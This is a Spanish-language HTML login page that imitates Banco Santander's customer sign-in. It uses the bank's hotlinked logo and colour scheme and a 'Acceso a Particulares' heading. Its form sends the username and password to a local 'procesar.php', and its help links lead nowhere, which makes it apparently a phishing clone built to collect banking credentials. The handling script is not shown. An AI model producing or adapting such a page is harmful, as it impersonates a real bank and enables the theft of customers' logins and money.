<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Inicio de Sesión - Banco</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            margin: 0;
            background-color: #f4f4f4;
            color: #333;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            padding: 10px;
        }
        .login-container {
            background: #fff;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
            max-width: 400px;
            width: 100%;
        }
        .login-header {
            text-align: center;
            margin-bottom: 20px;
        }
        .login-header img {
            width: 120px;
            margin-bottom: 15px;
        }
        .login-header h1 {
            font-size: 1.6em;
            color: #d10026;
            margin: 0;
        }
        .form-group {
            margin-bottom: 15px;
        }
        .form-group label {
            display: block;
            margin-bottom: 5px;
            font-weight: 500;
            font-size: 1em;
        }
        .form-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 1em;
        }
        .form-group input:focus {
            outline: none;
            border-color: #d10026;
            box-shadow: 0 0 4px rgba(209, 0, 38, 0.5);
        }
        .login-button {
            width: 100%;
            background: #d10026;
            color: #fff;
            padding: 10px;
            border: none;
            border-radius: 4px;
            font-size: 1.1em;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s ease;
        }
        .login-button:hover {
            background: #a0001e;
        }
        .login-button:active {
            background: #7a0017;
        }
        .help-links {
            text-align: center;
            margin-top: 15px;
        }
        .help-links a {
            color: #d10026;
            text-decoration: none;
            font-size: 0.9em;
        }
        .help-links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c4/Banco_Santander_Logotipo_%282007-2018%29.svg" alt="Logo Santander">
            <h1>Acceso a Particulares</h1>
        </div>
        <form action="procesar.php" method="POST">
            <div class="form-group">
                <label for="username">Usuario</label>
                <input type="text" id="username" name="username" placeholder="Ingresa tu usuario" required>
            </div>
            <div class="form-group">
                <label for="password">Contraseña</label>
                <input type="password" id="password" name="password" placeholder="Ingresa tu contraseña" required>
            </div>
            <button type="submit" class="login-button">Iniciar Sesión</button>
        </form>
        <div class="help-links">
            <a href="#">¿Olvidaste tu contraseña?</a><br>
            <a href="#">¿Necesitas ayuda?</a>
        </div>
    </div>
</body>
</html>
